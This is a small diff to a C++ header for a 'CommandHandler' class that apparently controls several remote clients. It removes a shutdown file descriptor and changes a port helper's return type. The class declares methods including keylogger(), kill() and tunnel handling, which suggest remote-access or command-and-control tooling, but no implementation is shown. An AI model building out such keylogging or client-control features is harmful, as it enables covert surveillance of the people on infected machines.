@@ -87,8 +87,7 @@ public:
         std::atomic<bool>* __p_shutdown_flag,
         std::string* __p_ip,
         uint __port,
-        int* __p_user_verbosity,
-        int __shutdown_event_fd
+        int* __p_user_verbosity
     );
     ~CommandHandler();
     void execute_command(char* __cmd, int __len);
@@ -105,7 +104,7 @@ private:
     void kill();
     void keylogger();
 
-    int find_open_port();
+    uint find_open_port();
     void send_packet(uint16_t __packet, int __client_index);    
     void send_client(CommandCode __command, uint8_t __port, int __client_index);
     void send_client(CommandCode __command);
@@ -122,7 +121,6 @@ private:
     int selected_client_;
     std::string cmd_;
     std::unordered_map<int, std::any> arg_map_;
-    int shutdown_event_fd_;
     std::vector<int> tunnel_shutdown_fds_;
 };
 
